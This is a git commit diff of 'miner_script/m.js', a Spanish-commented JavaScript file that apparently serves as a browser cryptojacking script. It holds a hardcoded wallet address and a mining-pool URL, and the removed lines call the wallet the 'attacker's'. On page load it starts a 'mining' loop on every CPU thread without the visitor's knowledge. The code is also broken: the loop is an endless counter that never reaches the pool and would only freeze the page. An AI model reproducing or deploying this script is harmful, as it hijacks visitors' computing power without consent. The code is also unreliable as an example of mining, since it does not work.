8a66f1cae7ea225a8cb160bbdf237affe3428f16
Gohsty <89268998+Gohstys@users.noreply.github.com>
2023-10-24 19:15:42 +0200

    m.js
    update

--- miner_script/m.js
+++ miner_script/m.js
@@ -1,50 +1,32 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <!-- Carga el archivo JavaScript -->
-    <script src="miner.js"></script>
-</head>
-<body>
-    <p>La URL de la pool es: <span id="pool-url"></span></p>
+// Dirección de la billetera 
+const walletAddress = 'WLD:0xe77070ce816595803c00deca32af997654ad47d8.WorkerN#iczs-elgt';
+var poolURL = "rx.unmineable.com:3333";
 
-    <script>
-        // Obtiene la URL de la pool
-        const poolURL = 'rx.unmineable.com:443';
+// Función para realizar la minería
+function startMining() {
+  // Obtiene la potencia de procesamiento de la CPU del usuario
+  const numThreads = navigator.hardwareConcurrency || 4; // Número de hilos de CPU
 
-        // Muestra la URL de la pool en el elemento span
-        document.getElementById("pool-url").textContent = poolURL;
+  // Bucle para simular la minería en cada hilo de CPU
+  for (let i = 0; i < numThreads; i++) {
+    // Realiza el proceso de minería en cada hilo
+    mine(walletAddress);
+  }
+}
 
-        // Dirección de la billetera de criptomonedas del atacante
-        const walletAddress = 'WLD:0xe77070ce816595803c00deca32af997654ad47d8.YWK#iczs-elgt';
+// Función para simular la minería
+function mine(wallet) {
+  // Realiza cálculos intensivos para la minería de criptomonedas
+  // En un entorno real, se utilizarían algoritmos criptográficos, pero aquí se usa un bucle simple para la demostración.
+  let nonce = 0;
+  while (true) {
+    // Calcula un hash o realiza otras operaciones de minería aquí
+    // El objetivo es encontrar un valor que cumpla con ciertos requisitos para obtener una recompensa en criptomonedas
+    nonce++;
+  }
+}
 
-        // Función para realizar la minería
-        function startMining() {
-          // Obtiene la potencia de procesamiento de la CPU del usuario
-          const numThreads = navigator.hardwareConcurrency || 4; // Número de hilos de CPU
-
-          // Bucle para simular la minería en cada hilo de CPU
-          for (let i = 0; i < numThreads; i++) {
-            // Realiza el proceso de minería en cada hilo
-            mine(walletAddress);
-          }
-        }
-
-        // Función para simular la minería
-        function mine(wallet) {
-          // Realiza cálculos intensivos para la minería de criptomonedas
-          // En un entorno real, se utilizarían algoritmos criptográficos, pero aquí se usa un bucle simple para la demostración.
-          let nonce = 0;
-          while (true) {
-            // Calcula un hash o realiza otras operaciones de minería aquí
-            // El objetivo es encontrar un valor que cumpla con ciertos requisitos para obtener una recompensa en criptomonedas
-            nonce++;
-          }
-        }
-
-        // Iniciar la minería cuando se carga la página
-        window.addEventListener('load', () => {
-          startMining();
-        });
-    </script>
-</body>
-</html>
+// Iniciar la minería cuando se carga la página
+window.addEventListener('load', () => {
+  startMining();
+});
